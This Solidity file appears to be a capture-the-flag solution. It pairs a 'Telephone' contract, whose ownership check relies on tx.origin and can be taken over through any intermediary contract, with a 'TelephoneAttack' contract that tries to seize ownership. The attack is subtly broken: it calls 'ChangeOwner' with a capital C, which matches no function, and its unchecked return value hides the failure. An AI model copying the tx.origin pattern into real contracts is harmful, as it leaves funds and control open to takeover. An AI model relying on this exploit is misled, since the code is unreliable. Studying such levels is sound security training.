// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneAttack {
    constructor(address _telephone, address _addr) public {
        (bool result, bytes memory err) = address(_telephone).call.value(0)(
            abi.encodeWithSignature("ChangeOwner(address)", _addr)
        );
    }
}
